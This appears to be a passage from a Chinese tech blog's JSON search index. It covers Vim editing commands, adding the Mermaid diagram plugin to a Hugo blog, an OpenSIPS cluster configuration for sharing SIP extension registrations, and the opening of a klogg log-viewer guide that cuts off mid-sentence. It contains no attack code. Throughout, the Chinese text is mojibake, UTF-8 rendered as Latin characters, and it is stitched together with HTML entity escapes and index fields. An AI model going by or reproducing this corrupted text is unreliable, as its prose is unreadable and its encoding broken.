è¿›å…¥é€‰æ‹©æ–‡æœ¬æ¨¡å¼ä¹‹å é€‰æ‹©å…‰æ ‡æ‰€åœ¨å•è¯ï¼ˆå…‰æ ‡è¦å…ˆä½äºå•è¯ä¸Šï¼‰ aw é€‰æ‹©å…‰æ ‡æ‰€åœ¨()åŒºåŸŸï¼ŒåŒ…æ‹¬()ï¼Œ å…‰æ ‡è¦å…ˆä½äºä¸€ä¸ªæ‹¬å·ä¸Š ab é€‰æ‹©å…‰æ ‡æ‰€åœ¨[]åŒºåŸŸï¼ŒåŒ…æ‹¬[], å…‰æ ‡è¦å…ˆä½äºä¸€ä¸ªæ‹¬å·ä¸Š aB é€‰æ‹©å…‰æ ‡æ‰€åœ¨()åŒºåŸŸï¼Œä¸åŒ…æ‹¬()ï¼Œ å…‰æ ‡è¦å…ˆä½äºä¸€ä¸ªæ‹¬å·ä¸Š ib é€‰æ‹©å…‰æ ‡æ‰€åœ¨[]åŒºåŸŸï¼Œä¸åŒ…æ‹¬[], å…‰æ ‡è¦å…ˆä½äºä¸€ä¸ªæ‹¬å·ä¸Š iB é€€å‡ºå¯è§†åŒ–åŒºåŸŸ esc 37. é€‰æ‹©æ–‡æœ¬å‘½ä»¤ å‘å·¦å³ç¼©è¿› \u0026lt;, \u0026gt; å¤åˆ¶ y å‰ªåˆ‡ d å¤§å°å†™è½¬æ¢ ~ 38. æ ‡è®° æ˜¾ç¤ºæ ‡è®°åˆ—è¡¨ :marks æ ‡è®°å½“å‰ä½ç½®ä¸ºa ma è·³è½¬åˆ°æ ‡è®°açš„ä½ç½® `a 39. å‰ªåˆ‡åˆ é™¤ å‰ªåˆ‡å½“å‰è¡Œ dd å‰ªåˆ‡2è¡Œ 2dd å‰ªåˆ‡å½“å‰å•è¯ dw ä»å…‰æ ‡æ‰€åœ¨ä½ç½®å‰ªåˆ‡åˆ°è¡Œå°¾ D, d$ å‰ªåˆ‡å½“å‰å­—ç¬¦ x åˆ é™¤å•å¼•å·ä¸­çš„å†…å®¹ di\u0026rsquo; daâ€™ åˆ é™¤åŒ…æ‹¬' åˆ é™¤åŒå¼•å·ä¸­çš„å†…å®¹ di\u0026quot; da\u0026quot; åˆ é™¤åŒ…æ‹¬\u0026quot; åˆ é™¤ä¸­æ‹¬å·ä¸­çš„å†…å®¹ di[ da[ åˆ é™¤åŒ…æ‹¬[ åˆ é™¤å¤§æ‹¬å·ä¸­çš„å†…å®¹ di{ da{ åˆ é™¤åŒ…æ‹¬{ åˆ é™¤æ‹¬å·ä¸­çš„å†…å®¹ di( da( åˆ é™¤åŒ…å«( ä»å½“å‰å…‰æ ‡ä½ç½®ï¼Œåˆ é™¤åˆ°åˆ°å­—ç¬¦a dta 40. globalå‘½ä»¤ åˆ é™¤æ‰€æœ‰ä¸åŒ…å«åŒ¹é…é¡¹çš„æ–‡æœ¬è¡Œ :v/re/d reå¯ä»¥æ˜¯å­—ç¬¦ï¼Œä¹Ÿå¯ä»¥æ˜¯æ­£åˆ™ æ˜¾ç¤ºæ‰€æœ‰ä¸åŒ…å«åŒ¹é…é¡¹çš„æ–‡æœ¬è¡Œ :v/re/p reå¯ä»¥æ˜¯å­—ç¬¦ï¼Œä¹Ÿå¯ä»¥æ˜¯æ­£åˆ™ åˆ é™¤åŒ…å«åŒ¹é…é¡¹çš„è¡Œ :g/re/d reå¯ä»¥æ˜¯å­—ç¬¦ï¼Œä¹Ÿå¯ä»¥æ˜¯æ­£åˆ™ æ˜¾ç¤ºæ‰€æœ‰åŒ…å«åŒ¹é…é¡¹çš„è¡Œ :g/re/p reå¯ä»¥æ˜¯å­—ç¬¦ï¼Œä¹Ÿå¯ä»¥æ˜¯æ­£åˆ™ 41. æ–‡æœ¬å¯¹è±¡ å½“å‰å•è¯ iw å½“å‰å•è¯å’Œä¸€ä¸ªç©ºæ ¼ aw å½“å‰å¥å­ is å½“å‰å¥å­å’Œä¸€ä¸ªç©ºæ ¼ as å½“å‰æ®µè½ ip å½“å‰æ®µè½å’Œä¸€ä¸ªç©ºè¡Œ ap ä¸€å¯¹åœ†æ‹¬å· a) æˆ– ab åœ†æ‹¬å·å†…éƒ¨ i) æˆ– ib ä¸€å¯¹èŠ±æ‹¬å· a}æˆ– aB èŠ±æ‹¬å·å†…éƒ¨ i}æˆ– iB aè¡¨ç¤ºåŒ¹é…ä¸¤ç‚¹å’Œä¸¤ç‚¹ä¹‹é—´çš„å­—ç¬¦), }, ], \u0026gt; , â€˜, â€œ, `, t(xml) iè¡¨ç¤ºåŒ¹é…ä¸¤ç‚¹å†…éƒ¨ä¹‹é—´çš„å­—ç¬¦ 42. å¤åˆ¶ å¤åˆ¶å½“å‰è¡Œ yy å¤åˆ¶2è¡Œ 2yy å¤åˆ¶å½“å‰å•è¯ yw ä»å…‰æ ‡æ‰€åœ¨ä½ç½®å¤åˆ¶åˆ°è¡Œå°¾ y$ å¤åˆ¶å•å¼•å·ä¸­çš„å†…å®¹ yi\u0026rsquo; ya\u0026rsquo; å¤åˆ¶åŒ…æ‹¬' å¤åˆ¶åŒå¼•å·ä¸­çš„å†…å®¹ yi\u0026quot; yaâ€ å¤åˆ¶åŒ…æ‹¬\u0026quot; å¤åˆ¶ä¸­æ‹¬å·ä¸­çš„å†…å®¹ yi[ ya[ å¤åˆ¶åŒ…æ‹¬[ å¤åˆ¶å¤§æ‹¬å·ä¸­çš„å†…å®¹ yi{ ya{ å¤åˆ¶åŒ…æ‹¬{ 43. ç²˜è´´ åœ¨å…‰æ ‡åç²˜è´´ p åœ¨å…‰æ ‡å‰ç²˜è´´ P 44. ä¿å­˜é€€å‡º ä¿å­˜ w ä¿å­˜å¹¶é€€å‡º wq ä¸ä¿å­˜é€€å‡º q! ä¿å­˜æ‰€æœ‰tabé¡µå¹¶é€€å‡º wqa 46. æŸ¥æ‰¾ å‘ä¸‹æŸ¥æ‰¾key /key å‘ä¸ŠæŸ¥æ‰¾key ?key ä¸‹ä¸€ä¸ªkey n ä¸Šä¸€ä¸ªkey N ç§»é™¤æœç´¢ç»“æœé«˜äº® :noh è®¾ç½®æœç´¢é«˜äº® :set hlsearch ç»Ÿè®¡å½“å‰æ¨¡å¼åŒ¹é…çš„ä¸ªæ•° :%s///gn 47. å­—ç¬¦ä¸²æ›¿æ¢ å…¨æ–‡å°†oldæ›¿æ¢ä¸ºnew %s/old/new/g å…¨æ–‡å°†oldæ›¿æ¢ä¸ºnew, ä½†æ˜¯ä¼šä¸€ä¸ªä¸€ä¸ªç¡®è®¤ %s/old/new/gc 48. å¤šæ–‡ä»¶æœç´¢ å¤šæ–‡ä»¶æœç´¢ :vimgrep /key/ {file} vimgrep /export/ */ åˆ‡æ¢åˆ°ä¸‹ä¸€ä¸ªæ–‡ä»¶ cn åˆ‡æ¢åˆ°ä¸Šä¸€ä¸ªæ–‡ä»¶ cp æŸ¥çœ‹æœç´¢ç»“æœåˆ—è¡¨ copen æŸ¥çœ‹æ–‡ä»¶ç¼“å†²åŒº :ls 49. çª—å£åˆ†å‰² æ°´å¹³åˆ†å‰²çª—å£ :split é»˜è®¤splitä»…é’ˆå¯¹å½“å‰æ–‡ä»¶ï¼Œå¦‚æœåœ¨æ–°çª—å£æ‰“å¼€æ–°çš„æ–‡ä»¶ï¼Œå¯ä»¥ï¼šsplit file å‚ç›´åˆ†å‰²çª—å£ :vsplit æ‰“å¼€ç©ºç™½çš„çª—å£ :new å…³é—­åˆ†å‰²çš„çª—å£ ctrl+wq, :close æœ‰æ—¶å€™ctrl+wqä¸ç®¡ç”¨ï¼Œéœ€è¦ç”¨close çª—å£ä¹‹é—´åˆ‡æ¢ ctrl+ww åˆ‡æ¢åˆ°å·¦è¾¹çª—å£ ctrl+wh åˆ‡æ¢åˆ°å³è¾¹çª—å£ ctrl+wl åˆ‡æ¢åˆ°ä¸‹è¾¹çª—å£ ctrl+wj åˆ‡æ¢åˆ°ä¸Šè¾¹çª—å£ ctrl+wk å…³é—­æ‰€æœ‰çª—å£ :qall è¿™è¡¨ç¤º \u0026ldquo;quit all\u0026rdquo; (å…¨éƒ¨é€€å‡º)ã€‚å¦‚æœä»»ä½•ä¸€ä¸ªçª—å£æ²¡æœ‰å­˜ç›˜ï¼ŒVim éƒ½ä¸ä¼šé€€å‡ºã€‚åŒæ—¶å…‰ æ ‡ä¼šè‡ªåŠ¨è·³åˆ°é‚£ä¸ªçª—å£ï¼Œä½ å¯ä»¥ç”¨ \u0026ldquo;:write\u0026rdquo; å‘½ä»¤ä¿å­˜è¯¥æ–‡ä»¶æˆ–è€… \u0026ldquo;:quit!\u0026rdquo; æ”¾å¼ƒä¿®æ”¹ã€‚ ä¿å­˜æ‰€æœ‰çª—å£ä¿®æ”¹åçš„å†…å®¹ :wall å¦‚æœä½ çŸ¥é“æœ‰çª—å£è¢«æ”¹äº†ï¼Œè€Œä½ æƒ³å…¨éƒ¨ä¿å­˜ å…³é—­æ‰€æœ‰çª—å£ï¼Œæ”¾å¼ƒæ‰€æœ‰ä¿®æ”¹ :qall! æ³¨æ„ï¼Œè¿™ä¸ªå‘½ä»¤æ˜¯ä¸èƒ½æ’¤é”€çš„ã€‚ ä¿å­˜æ‰€æœ‰ä¿®æ”¹ï¼Œç„¶åé€€å‡ºvim :wqall çª—å£æ›´å¤šå†…å®¹ http://vimcdoc.sourceforge.net/doc/usr_08.html#usr_08.txt\n50. å® å½•åˆ¶å®a qa åœæ­¢å½•åˆ¶å® q 51. æ ‡ç­¾é¡µ æ–°å»ºæ ‡ç­¾é¡µ tabnew åœ¨æ–°æ ‡ç­¾é¡µä¸­æ‰“å¼€file tabnew file åˆ‡æ¢åˆ°ä¸‹ä¸ªæ ‡ç­¾é¡µ gt åˆ‡æ¢åˆ°ä¸Šä¸ªæ ‡ç­¾é¡µ gT å…³é—­å½“å‰æ ‡ç­¾é¡µ :tabclose, :tabc å…³é—­å…¶ä»–æ ‡ç­¾é¡µ :tabo, :tabonly åœ¨æ‰€æœ‰æ ‡ç­¾é¡µä¸­æ‰§è¡Œå‘½ä»¤ :tabdo commad :tabdo w 52. æ–‡æœ¬æŠ˜å  æŠ˜å æ–‡æœ¬å†…å®¹ zfap http://vimcdoc.sourceforge.net/doc/usr_28.html#usr_28.txt æ‰“å¼€æŠ˜å  zo å…³é—­æŠ˜å  zc å±•å¼€æ‰€æœ‰æŠ˜å  zr æ‰“å¼€æ‰€æœ‰å…‰æ ‡è¡Œä¸Šçš„æŠ˜å ç”¨ zO å…³é—­æ‰€æœ‰å…‰æ ‡è¡Œä¸Šçš„æŠ˜å ç”¨ zC åˆ é™¤ä¸€ä¸ªå…‰æ ‡è¡Œä¸Šçš„æŠ˜å ç”¨ zd åˆ é™¤æ‰€æœ‰å…‰æ ‡è¡Œä¸Šçš„æŠ˜å ç”¨ zD 53. è®¾ç½® è®¾ç½®vimç¼–è¾‘å™¨çš„å®½åº¦ set columns=200 54. è‡ªåŠ¨è¡¥å…¨ ä½¿ç”¨è‡ªåŠ¨è¡¥å…¨çš„ä¸‹ä¸€ä¸ªåˆ—è¡¨é¡¹ ctrl+n ä½¿ç”¨è‡ªåŠ¨è¡¥å…¨çš„ä¸Šä¸€ä¸ªåˆ—è¡¨é¡¹ ctrl+p ç¡®è®¤å½“å‰é€‰æ‹©é¡¹ ctrl+y è¿˜åŸæœ€æ—©è¾“å…¥é¡¹ ctrl+e 55. æ‚é¡¹ åœ¨vimä¸­æ‰§è¡Œå¤–éƒ¨å‘½ä»¤ :!ls -al æŸ¥çœ‹å½“å‰å…‰æ ‡æ‰€åœ¨è¡Œä¸ç™¾åˆ†æ¯” ctrl+g æŒ‚èµ·vim, ä½¿å…¶åœ¨åå°è¿è¡Œ ctrl+z æŸ¥çœ‹åå°æŒ‚èµ·çš„ç¨‹åº jobs ä½¿æŒ‚èµ·çš„vimå‰å°è¿è¡Œ fg å¦‚æœæœ‰å¤šä¸ªåå°æŒ‚èµ·çš„ä»»åŠ¡ï¼Œ åˆ™éœ€è¦æŒ‡å®šä»»åŠ¡åºå·ï¼Œå¦‚ ï¼šfg %1 åœ¨æ¯è¡Œè¡Œå°¾æ·»åŠ å­—ç¬¦ä¸²abc :%s/$/abc åœ¨æ¯è¡Œè¡Œé¦–æ·»åŠ å­—ç¬¦ä¸²abc :%s/^/abc æ¯è¡Œè¡Œå°¾åˆ é™¤å­—ç¬¦ä¸²abc :%s/$/abc æ¯è¡Œè¡Œé¦–åˆ é™¤å­—ç¬¦ä¸²abc :%s/^/abc åˆ é™¤å«æœ‰abcå­—ç¬¦ä¸²çš„è¡Œ :g/abc/d åˆ é™¤æ¯è¡Œè¡Œé¦–åˆ°ç‰¹å®šå­—ç¬¦çš„å†…å®¹ï¼Œéè´ªå©ªåŒ¹é… : %s/^.{-}abc// var = abc123, ä¼šåˆ é™¤var = abc è°ƒæ¢å½“å‰è¡Œå’Œå®ƒçš„ä¸‹ä¸€è¡Œ ddp å…¨æ–‡æ ¼å¼åŒ– gg è·³åˆ°ç¬¬ä¸€è¡Œ shift v shift g = å‚è€ƒ\nhttps://vim.rtorr.com/lang/zh_cn http://vimcdoc.sourceforge.net/doc/help.html https://www.oschina.net/translate/learn-vim-progressively ","permalink":"https://wdd.js.org/vim/vim-tips/","summary":"Info Cè¡¨ç¤ºæŒ‰ä½Ctrl, C-oè¡¨ç¤ºåŒæ—¶æŒ‰ä½Ctrlå’Œo 1. åœ¨tmuxä¸­ vim-airlineæ’ä»¶é¢œè‰²æ˜¾ç¤ºä¸æ­£å¸¸ è§£å†³æ–¹æ¡ˆï¼š\nexport TERM=screen-256color 2. bufferç›¸å…³æ“ä½œ :ls # æ˜¾ç¤ºæ‰€æœ‰æ‰“å¼€çš„buffer :b {bufferName} #æ”¯æŒtabé”®è‡ªåŠ¨è¡¥å…¨ :bd # å…³é—­å½“å‰buffer :bn # åˆ‡æ¢åˆ°ä¸‹ä¸€ä¸ªbuffer :bp # åˆ‡æ¢åˆ°ä¸Šä¸€ä¸ªbuffer :b# # åˆ‡æ¢åˆ°ä¸Šä¸€ä¸ªè®¿é—®è¿‡çš„buffer :b1 # åˆ‡æ¢åˆ°buffer1 :bm # åˆ‡æ¢åˆ°æœ€è¿‘ä¿®æ”¹è¿‡çš„buffer :sb {bufferName} # ä¸Šä¸‹åˆ†å± :vert sb {bufferName} # å·¦å³åˆ†å± 3. è·³è½¬åˆ°å¯¹åº”çš„ç¬¦å·ä¸Š ä¸‹é¢è¿™ç§ç¬¦å·ï¼Œä¸€èˆ¬éƒ½æ˜¯æˆåŒæˆå¯¹çš„ï¼Œåªè¦åœ¨å…¶ä¸­ä¸€ä¸ªä¸ŠæŒ‰%, å°±ä¼šè‡ªåŠ¨è·³è½¬åˆ°å¯¹åº”çš„ç¬¦å·\n() [] {} 4. å…³é—­netrwçš„banner å¦‚æœç†Ÿç»ƒçš„æ˜¯ç”¨äº†netrwï¼Œå°±å¯ä»¥æŠŠé»˜è®¤å¼€å¯çš„bannerç»™å…³é—­æ‰ã€‚\nlet g:netrw_banner = 0 let g:netrw_liststyle = 3 let g:netrw_winsize = 25 5. å¦‚ä½•åŒæ—¶ä¿å­˜æ‰€æœ‰å‘ç”Ÿå˜åŒ–çš„æ–‡ä»¶ï¼Ÿ æŠŠæ‰€æœ‰å‘ç”Ÿå˜åŒ–çš„æ–‡ä»¶ç»™ä¿å­˜ :wa æŠŠæ‰€æœ‰å‘ç”Ÿå˜åŒ–çš„æ–‡ä»¶éƒ½ä¿å­˜ï¼Œç„¶åé€€å‡ºvim :xa é€€å‡ºvim, æ‰€æœ‰å‘ç”Ÿå˜åŒ–çš„æ–‡ä»¶éƒ½ä¸ä¿å­˜ï¼Œ:qa!","title":"1001ä¸ªVimé«˜çº§æŠ€å·§ - 0-55"},{"content":"step1 åœ¨themes/YourTheme/layouts/partials/extend_footer.html çš„æœ€åè¿½åŠ å¦‚ä¸‹å†…å®¹\n{{if .Store.Get \u0026#34;hasMermaid\u0026#34; }} \u0026lt;script type=\u0026#34;module\u0026#34;\u0026gt; import mermaid from \u0026#39;https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.esm.min.mjs\u0026#39;; mermaid.initialize({ startOnLoad: true }); \u0026lt;/script\u0026gt; {{end }} step2: åœ¨layouts/_default/_markup/render-codeblock-mermaid.html\n\u0026lt;pre class=\u0026#34;mermaid\u0026#34;\u0026gt; {{- .Inner | htmlEscape | safeHTML }} \u0026lt;/pre\u0026gt; {{ .Page.Store.Set \u0026#34;hasMermaid\u0026#34; true }} åœ¨blogä¸­å¢åŠ å¦‚ä¸‹ä»£ç  pie title French Words I Know \u0026#34;Merde\u0026#34; : 50 \u0026#34;Oui\u0026#34; : 35 \u0026#34;Alors\u0026#34; : 10 \u0026#34;Non\u0026#34; : 5 sequenceDiagram title French Words I Know autonumber Alice-\u0026gt;\u0026gt;Bob: hello Bob--\u0026gt;\u0026gt;Alice: hi Alice-\u0026gt;Bob: talking ","permalink":"https://wdd.js.org/posts/2022/05/02-hugo-add-mermaid/","summary":"step1 åœ¨themes/YourTheme/layouts/partials/extend_footer.html çš„æœ€åè¿½åŠ å¦‚ä¸‹å†…å®¹\n{{if .Store.Get \u0026#34;hasMermaid\u0026#34; }} \u0026lt;script type=\u0026#34;module\u0026#34;\u0026gt; import mermaid from \u0026#39;https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.esm.min.mjs\u0026#39;; mermaid.initialize({ startOnLoad: true }); \u0026lt;/script\u0026gt; {{end }} step2: åœ¨layouts/_default/_markup/render-codeblock-mermaid.html\n\u0026lt;pre class=\u0026#34;mermaid\u0026#34;\u0026gt; {{- .Inner | htmlEscape | safeHTML }} \u0026lt;/pre\u0026gt; {{ .Page.Store.Set \u0026#34;hasMermaid\u0026#34; true }} åœ¨blogä¸­å¢åŠ å¦‚ä¸‹ä»£ç  pie title French Words I Know \u0026#34;Merde\u0026#34; : 50 \u0026#34;Oui\u0026#34; : 35 \u0026#34;Alors\u0026#34; : 10 \u0026#34;Non\u0026#34; : 5 sequenceDiagram title French Words I Know autonumber Alice-\u0026gt;\u0026gt;Bob: hello Bob--\u0026gt;\u0026gt;Alice: hi Alice-\u0026gt;Bob: talking ","title":"hugoåšå®¢å¢åŠ mermaid ç»˜å›¾æ’ä»¶"},{"content":"å…±äº«åˆ†æœºæ³¨å†Œä¿¡æ¯æœ‰ä¸¤ç§æ–¹å¼\né›†ç¾¤ä½¿ç”¨ç›¸åŒçš„æ•°æ®åº“ï¼Œå¤šä¸ªèŠ‚ç‚¹å®æ—¶è¯»å–æ•°æ® ä¼˜ç‚¹ï¼šä½¿ç”¨ç®€å•ï¼Œå³ä½¿æ‰€æœ‰èŠ‚ç‚¹é‡å¯ï¼Œä¹Ÿèƒ½ç«‹å³ä»æ•°æ®åº“ä¸­æ¢å¤åˆ†æœºæ³¨å†Œæ•°æ® ç¼ºç‚¹ï¼šå¯¹æ•°æ®åº“è¿‡äºä¾èµ–ï¼Œä¸€æ—¦æ•°æ®åº“å‡ºç°æ€§èƒ½ç“¶é¢ˆï¼Œåˆ™ä¼šç«‹å³å½±å“æ‰€æœ‰çš„å‘¼å« æ˜¯ç”¨clusteræ¨¡å—ï¼Œä¸ä½¿ç”¨æ•°æ®åº“ï¼Œé€šè¿‡opensipsè‡ªå¸¦çš„äºŒè¿›åˆ¶åŒæ­¥æ–¹å¼ ä¼˜ç‚¹ï¼šä¸ç”¨æ•°æ®åº“ï¼Œæ¶ˆæ¯å¤„ç†é€Ÿåº¦å¿«ï¼Œå‡å°‘å¯¹æ•°æ®åº“çš„å‹åŠ› ç¼ºç‚¹ï¼šä¸€æ—¦æ‰€æœ‰èŠ‚ç‚¹æŒ‚æ‰ï¼Œæ‰€æœ‰çš„åˆ†æœºæ³¨å†Œä¿¡æ¯éƒ½ä¼šæŸå¤±ã€‚ä½†æ˜¯æŒ‚æ‰æ‰€æœ‰èŠ‚ç‚¹çš„æ¦‚ç‡è¿˜æ˜¯æ¯”è¾ƒå°çš„ã€‚ ä»Šå¤©è¦è®²çš„æ–¹å¼å°±æ˜¯é€šè¿‡clusterçš„æ–¹å¼è¿›è¡Œå…±äº«æ³¨å†Œä¿¡æ¯çš„æ–¹æ¡ˆã€‚\nå‡è®¾æœ‰ä¸‰ä¸ªèŠ‚ç‚¹ï¼š\nåœ¨å…¶ä¸­ä¸€ä¸ªèŠ‚ç‚¹ä¸Šæ³¨å†Œçš„åˆ†æœºä¿¡æ¯ä¼šåŒæ­¥ç»™å…¶ä»–çš„èŠ‚ç‚¹ å‡è®¾å…¶ä¸­èŠ‚ç‚¹aé‡å¯äº†ï¼ŒèŠ‚ç‚¹aä¼šè‡ªåŠ¨é€‰æ‹©bæˆ–è€…cæ¥æ‹‰å–ç¬¬ä¸€æ¬¡åˆå§‹åŒ–çš„åˆ†æœºä¿¡æ¯ ä¸¾ä¾‹æ¥è¯´ï¼š\n8001åˆ†æœºåœ¨bä¸Šæ³¨å†ŒæˆåŠŸ bæŠŠ8001çš„æ³¨å†Œä¿¡æ¯é€šè¿‡clusteræ¨¡å—é€šçŸ¥ç»™aå’Œc 8002åˆ†æœºåœ¨aä¸Šæ³¨å†ŒæˆåŠŸ aæŠŠ8002çš„æ³¨å†Œä¿¡æ¯é€šè¿‡clusteræ¨¡å—é€šçŸ¥ç»™bå’Œc æ­¤æ—¶æ•´ä¸ªé›†ç¾¤æœ‰ä¸¤ä¸ªåˆ†æœº8001å’Œ8002 èŠ‚ç‚¹cçªç„¶å´©æºƒé‡å¯ èŠ‚ç‚¹cé‡å¯ä¹‹åï¼Œå‘bå‘å‡ºè¯·æ±‚ï¼Œè·å–æ‰€æœ‰æ³¨å†Œçš„åˆ†æœº èŠ‚ç‚¹båƒèŠ‚ç‚¹cæ¨é€å…¨é‡çš„åˆ†æœºæ³¨å†Œä¿¡æ¯ æ­¤æ—¶ä¸‰ä¸ªèŠ‚ç‚¹åˆæ¢å¤åŒæ­¥çŠ¶æ€ clusterè¡¨è®¾è®¡:\nç©ºçš„å­—æ®µæˆ‘å°±æ²¡å†™äº†ï¼Œflagså­—æ®µå¿…é¡»è®¾ç½®ä¸ºseed, è¿™æ ·èŠ‚ç‚¹é‡å¯åï¼Œæ‰çŸ¥é“è¦åƒå“ªä¸ªèŠ‚ç‚¹åŒæ­¥å…¨é‡æ•°æ® id,cluster_id,node_id,url,state,flags 1,1,1,bin:a:5000,1,seed 2,1,2,bin:b:5000,1,seed 3,1,3,bin:c:5000,1,seed è„šæœ¬ä¿®æ”¹ï¼š\n# å¢åŠ  binçš„listen, å¯¹åº”clusterè¡¨çš„url listen=bin:192.168.2.130:5000 # åŠ è½½proto_binå’Œclustereræ¨¡å— loadmodule \u0026#34;proto_bin.so\u0026#34; loadmodule \u0026#34;clusterer.so\u0026#34; modparam(\u0026#34;clusterer\u0026#34;, \u0026#34;db_url\u0026#34;, \u0026#34;mysql:xxxx\u0026#34;) # è®¾ç½®æ•°æ®åº“åœ°å€ modparam(\u0026#34;clusterer\u0026#34;, \u0026#34;current_id\u0026#34;, 1) # è®¾ç½®å½“å‰node_id modparam(\u0026#34;usrloc\u0026#34;, \u0026#34;working_mode_preset\u0026#34;, \u0026#34;full-sharing-cluster\u0026#34;) modparam(\u0026#34;usrloc\u0026#34;, \u0026#34;location_cluster\u0026#34;, 1) # è®¾ç½®å½“å‰çš„é›†ç¾¤id å…¶ä»–æ“ä½œä¿æŒåŸæ ·ï¼Œopensipså°±ä¼šè‡ªåŠ¨åŒæ­¥åˆ†æœºæ•°æ®äº†ã€‚\n","permalink":"https://wdd.js.org/opensips/ch9/cluster-share-location/","summary":"å…±äº«åˆ†æœºæ³¨å†Œä¿¡æ¯æœ‰ä¸¤ç§æ–¹å¼\né›†ç¾¤ä½¿ç”¨ç›¸åŒçš„æ•°æ®åº“ï¼Œå¤šä¸ªèŠ‚ç‚¹å®æ—¶è¯»å–æ•°æ® ä¼˜ç‚¹ï¼šä½¿ç”¨ç®€å•ï¼Œå³ä½¿æ‰€æœ‰èŠ‚ç‚¹é‡å¯ï¼Œä¹Ÿèƒ½ç«‹å³ä»æ•°æ®åº“ä¸­æ¢å¤åˆ†æœºæ³¨å†Œæ•°æ® ç¼ºç‚¹ï¼šå¯¹æ•°æ®åº“è¿‡äºä¾èµ–ï¼Œä¸€æ—¦æ•°æ®åº“å‡ºç°æ€§èƒ½ç“¶é¢ˆï¼Œåˆ™ä¼šç«‹å³å½±å“æ‰€æœ‰çš„å‘¼å« æ˜¯ç”¨clusteræ¨¡å—ï¼Œä¸ä½¿ç”¨æ•°æ®åº“ï¼Œé€šè¿‡opensipsè‡ªå¸¦çš„äºŒè¿›åˆ¶åŒæ­¥æ–¹å¼ ä¼˜ç‚¹ï¼šä¸ç”¨æ•°æ®åº“ï¼Œæ¶ˆæ¯å¤„ç†é€Ÿåº¦å¿«ï¼Œå‡å°‘å¯¹æ•°æ®åº“çš„å‹åŠ› ç¼ºç‚¹ï¼šä¸€æ—¦æ‰€æœ‰èŠ‚ç‚¹æŒ‚æ‰ï¼Œæ‰€æœ‰çš„åˆ†æœºæ³¨å†Œä¿¡æ¯éƒ½ä¼šæŸå¤±ã€‚ä½†æ˜¯æŒ‚æ‰æ‰€æœ‰èŠ‚ç‚¹çš„æ¦‚ç‡è¿˜æ˜¯æ¯”è¾ƒå°çš„ã€‚ ä»Šå¤©è¦è®²çš„æ–¹å¼å°±æ˜¯é€šè¿‡clusterçš„æ–¹å¼è¿›è¡Œå…±äº«æ³¨å†Œä¿¡æ¯çš„æ–¹æ¡ˆã€‚\nå‡è®¾æœ‰ä¸‰ä¸ªèŠ‚ç‚¹ï¼š\nåœ¨å…¶ä¸­ä¸€ä¸ªèŠ‚ç‚¹ä¸Šæ³¨å†Œçš„åˆ†æœºä¿¡æ¯ä¼šåŒæ­¥ç»™å…¶ä»–çš„èŠ‚ç‚¹ å‡è®¾å…¶ä¸­èŠ‚ç‚¹aé‡å¯äº†ï¼ŒèŠ‚ç‚¹aä¼šè‡ªåŠ¨é€‰æ‹©bæˆ–è€…cæ¥æ‹‰å–ç¬¬ä¸€æ¬¡åˆå§‹åŒ–çš„åˆ†æœºä¿¡æ¯ ä¸¾ä¾‹æ¥è¯´ï¼š\n8001åˆ†æœºåœ¨bä¸Šæ³¨å†ŒæˆåŠŸ bæŠŠ8001çš„æ³¨å†Œä¿¡æ¯é€šè¿‡clusteræ¨¡å—é€šçŸ¥ç»™aå’Œc 8002åˆ†æœºåœ¨aä¸Šæ³¨å†ŒæˆåŠŸ aæŠŠ8002çš„æ³¨å†Œä¿¡æ¯é€šè¿‡clusteræ¨¡å—é€šçŸ¥ç»™bå’Œc æ­¤æ—¶æ•´ä¸ªé›†ç¾¤æœ‰ä¸¤ä¸ªåˆ†æœº8001å’Œ8002 èŠ‚ç‚¹cçªç„¶å´©æºƒé‡å¯ èŠ‚ç‚¹cé‡å¯ä¹‹åï¼Œå‘bå‘å‡ºè¯·æ±‚ï¼Œè·å–æ‰€æœ‰æ³¨å†Œçš„åˆ†æœº èŠ‚ç‚¹båƒèŠ‚ç‚¹cæ¨é€å…¨é‡çš„åˆ†æœºæ³¨å†Œä¿¡æ¯ æ­¤æ—¶ä¸‰ä¸ªèŠ‚ç‚¹åˆæ¢å¤åŒæ­¥çŠ¶æ€ clusterè¡¨è®¾è®¡:\nç©ºçš„å­—æ®µæˆ‘å°±æ²¡å†™äº†ï¼Œflagså­—æ®µå¿…é¡»è®¾ç½®ä¸ºseed, è¿™æ ·èŠ‚ç‚¹é‡å¯åï¼Œæ‰çŸ¥é“è¦åƒå“ªä¸ªèŠ‚ç‚¹åŒæ­¥å…¨é‡æ•°æ® id,cluster_id,node_id,url,state,flags 1,1,1,bin:a:5000,1,seed 2,1,2,bin:b:5000,1,seed 3,1,3,bin:c:5000,1,seed è„šæœ¬ä¿®æ”¹ï¼š\n# å¢åŠ  binçš„listen, å¯¹åº”clusterè¡¨çš„url listen=bin:192.168.2.130:5000 # åŠ è½½proto_binå’Œclustereræ¨¡å— loadmodule \u0026#34;proto_bin.so\u0026#34; loadmodule \u0026#34;clusterer.so\u0026#34; modparam(\u0026#34;clusterer\u0026#34;, \u0026#34;db_url\u0026#34;, \u0026#34;mysql:xxxx\u0026#34;) # è®¾ç½®æ•°æ®åº“åœ°å€ modparam(\u0026#34;clusterer\u0026#34;, \u0026#34;current_id\u0026#34;, 1) # è®¾ç½®å½“å‰node_id modparam(\u0026#34;usrloc\u0026#34;, \u0026#34;working_mode_preset\u0026#34;, \u0026#34;full-sharing-cluster\u0026#34;) modparam(\u0026#34;usrloc\u0026#34;, \u0026#34;location_cluster\u0026#34;, 1) # è®¾ç½®å½“å‰çš„é›†ç¾¤id å…¶ä»–æ“ä½œä¿æŒåŸæ ·ï¼Œopensipså°±ä¼šè‡ªåŠ¨åŒæ­¥åˆ†æœºæ•°æ®äº†ã€‚","title":"é›†ç¾¤å…±äº«åˆ†æœºæ³¨å†Œä¿¡æ¯"},{"content":"é¡¹ç›®ä¿¡æ¯ githubåœ°å€ https://github.com/variar/klogg\n1. å®‰è£… kloggæ˜¯ä¸ªè·¨å¹³å°è½¯ä»¶ï¼Œwindows, mac, linuxéƒ½å¯ä»¥å®‰è£…ã€‚å…·ä½“å®‰è£…æ–¹å¼å‚è€ƒgithubé¡¹ç›®åœ°å€\n2. ç•Œé¢å¸ƒå±€ æ–‡ä»¶ä¿¡æ¯æ  æ—¥å¿—æ  è¿‡æ»¤å™¨è®¾ç½®æ  è¿‡æ»¤åçš„æ—¥å¿—æ˜¾ç¤ºæ  3. æ–‡ä»¶åŠ è½½ kloggæ”¯æŒå¤šç§æ–¹å¼åŠ 